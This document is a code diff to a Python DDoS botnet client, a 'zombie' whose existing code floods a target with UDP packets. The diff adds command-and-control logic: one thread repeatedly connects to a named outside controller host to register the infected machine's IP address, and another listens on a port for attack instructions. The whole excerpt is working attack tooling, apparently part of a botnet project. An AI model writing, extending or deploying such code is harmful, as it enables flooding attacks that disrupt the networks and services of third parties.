@@ -32,10 +32,37 @@ class attackUDPFlood(threading.Thread):
         while time.time() - start < self.timeout:
             victim.sendto(MESSAGE, (self.target, self.port))
 
+class registerIP(threading.Thread):
+    def __init__(self, HOST, PORT):
+        threading.Thread.__init__(self)
+        self.HOST = HOST
+        self.PORT = PORT
+
+    def run(self):
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.HOST, self.PORT))
+            sock.sendall(socket.gethostbyname(socket.gethostname()))
+            time.sleep(5)
+
+class waitForInstructions(threading.Thread):
+    def __init__(self, HOST, PORT):
+        threading.Thread.__init__(self)
+        self.HOST = HOST
+        self.PORT = PORT
+
+    def run(self):
+        server = SocketServer.TCPServer((self.HOST, self.PORT), zombie)
+        server.serve_forever()
 
 if __name__ == '__main__':
-    HOST = socket.gethostbyname(socket.gethostname())
-    PORT = 15000
+    controlIP = "chunkeey.cs.washington.edu"
+    zombieIP = socket.gethostbyname(socket.gethostname())
+    controlPORT = 14000
+    getInstrPORT = 15000
 
-    server = SocketServer.TCPServer((HOST, PORT), zombie)
-    server.serve_forever()
+    instr = waitForInstructions(zombieIP, getInstrPORT)
+    regis = registerIP(controlIP, controlPORT)
+
+    instr.start()
+    regis.start()
